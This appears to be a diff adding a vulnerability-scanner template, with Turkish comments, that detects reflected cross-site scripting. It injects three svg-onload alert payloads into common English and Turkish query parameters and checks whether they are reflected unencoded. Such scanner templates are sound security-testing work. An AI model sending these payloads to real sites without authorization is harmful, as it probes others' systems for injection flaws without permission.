@@ -1,0 +1,75 @@
+id: xss-reflected
+
+info:
+  name: Reflected XSS Detection (Yansıyan XSS Tespiti)
+  author: ertansa
+  severity: high
+  description: |
+    Yaygın sorgu parametrelerine benzersiz bir XSS kanaryası enjekte eder ve
+    yükün yanıt gövdesinde HTML olarak KODLANMADAN (ham `<`, `>`, tırnak) yansıyıp
+    yansımadığını denetler. Yalnızca gerçek (kodlanmamış) yansımada ateşlendiği
+    için yanlış pozitif düşüktür. İngilizce ve Türkçe parametre adlarını kapsar.
+    -dast gerektirmez.
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+    - https://portswigger.net/web-security/cross-site-scripting/reflected
+  classification:
+    cwe-id: CWE-79
+  metadata:
+    max-request: 51
+  tags: xss,injection,reflected
+
+variables:
+  rnd: "{{rand_base(6)}}"
+
+http:
+  - method: GET
+    attack: clusterbomb
+    payloads:
+      param:
+        - "q"
+        - "s"
+        - "search"
+        - "query"
+        - "id"
+        - "name"
+        - "keyword"
+        - "lang"
+        - "page"
+        - "redirect"
+        - "return"
+        - "msg"
+        - "error"
+        # Türkçe parametre adları
+        - "ara"
+        - "aranan"
+        - "anahtar"
+        - "mesaj"
+      xss:
+        - '"><svg/onload=alert({{rnd}})>'
+        - "'><svg/onload=alert({{rnd}})>"
+        - '</script><svg/onload=alert({{rnd}})>'
+    path:
+      - "{{BaseURL}}?{{param}}={{xss}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      # Yük HTML olarak kodlanmadan yansıdıysa (gerçek XSS göstergesi)
+      - type: dsl
+        dsl:
+          - "contains(body, '<svg/onload=alert(' + rnd + ')>')"
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'Yansiyan yuk: <svg/onload=alert(' + rnd + ')>'"
